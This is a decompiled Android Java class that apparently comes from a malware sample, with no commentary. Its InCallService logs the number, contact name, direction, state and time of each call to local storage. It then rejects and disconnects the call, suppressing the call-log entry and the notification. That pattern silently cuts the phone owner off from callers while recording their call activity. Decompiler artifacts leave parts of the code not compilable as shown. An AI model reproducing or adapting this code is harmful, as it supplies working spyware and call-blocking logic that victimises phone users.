/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.os.Build$VERSION
 *  android.telecom.Call
 *  android.telecom.Call$Callback
 *  android.telecom.CallScreeningService$CallResponse$Builder
 *  android.telecom.InCallService
 */
package linker.resourcer.encoder;

import android.content.Context;
import android.os.Build;
import android.telecom.Call;
import android.telecom.CallScreeningService;
import android.telecom.InCallService;
import linker.resourcer.encoder.SmsCallsStorage;
import linker.resourcer.encoder.Tools;
import linker.resourcer.encoder.UtilityHelper;

public class MyInCallService
extends InCallService {
    private static final String TAG = "MyInCallService";

    public void onCallAdded(Call call) {
        String string2;
        super.onCallAdded(call);
        Object object = call.getDetails();
        String string3 = string2 = null;
        if (object != null) {
            string3 = string2;
            if (object.getHandle() != null) {
                string3 = object.getHandle().getSchemeSpecificPart();
            }
        }
        String string4 = string2 = Tools.getContactNameFromNumber((Context)this, string3);
        if (string2 == null) {
            string4 = string3;
        }
        if (object != null && Build.VERSION.SDK_INT >= 29) {
            switch (object.getCallDirection()) {
                default: {
                    string2 = "UNKNOWN";
                    break;
                }
                case 1: {
                    string2 = "OUTGOING";
                    break;
                }
                case 0: {
                    string2 = "INCOMING";
                    break;
                }
            }
        } else {
            string2 = "UNKNOWN";
        }
        object = UtilityHelper.stateCallString(call.getState());
        SmsCallsStorage.Record(string2 + "|" + (String)object + "|" + string3 + "|" + string4 + "|" + System.currentTimeMillis(), SmsCallsStorage.EntryType.CALL);
        call.registerCallback(new Call.Callback(this, string2, string3, string4){
            final MyInCallService this$0;
            final String val$callName;
            final String val$callNumber;
            final String val$directionStr;
            {
                this.this$0 = myInCallService;
                this.val$directionStr = string2;
                this.val$callNumber = string3;
                this.val$callName = string4;
            }

            public void onStateChanged(Call object, int n) {
                object = UtilityHelper.stateCallString(n);
                if (n == 7 || n == 4 || n == 2) {
                    SmsCallsStorage.Record(this.val$directionStr + "|" + (String)object + "|" + this.val$callNumber + "|" + this.val$callName + "|" + UtilityHelper.FullStamp(), SmsCallsStorage.EntryType.CALL);
                }
            }
        });
        string2 = new CallScreeningService.CallResponse.Builder();
        string2.setDisallowCall(true).setRejectCall(true).setSkipCallLog(true).setSkipNotification(true);
        string2.build();
        call.disconnect();
    }

    public void onCallRemoved(Call call) {
        super.onCallRemoved(call);
    }

    public void onCreate() {
        super.onCreate();
    }
}

